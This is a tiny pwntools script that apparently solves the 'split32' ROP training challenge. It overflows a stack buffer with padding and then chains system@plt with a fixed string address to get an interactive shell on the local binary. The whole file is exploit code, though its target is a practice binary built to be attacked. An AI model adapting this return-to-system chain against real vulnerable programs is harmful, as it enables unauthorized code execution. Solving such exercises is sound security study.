from pwn import * 
 
p = process('./split32') 
elf = ELF('./split32') 
sys_addr = elf.plt['system'] 
binsh_addr = 0x0804A030 
payload = 'A'*0x28 + 'A'*0x04 + p32(sys_addr)+'A'*0x04+p32(binsh_addr) 
p.sendlineafter('> ',payload) 
p.interactive()
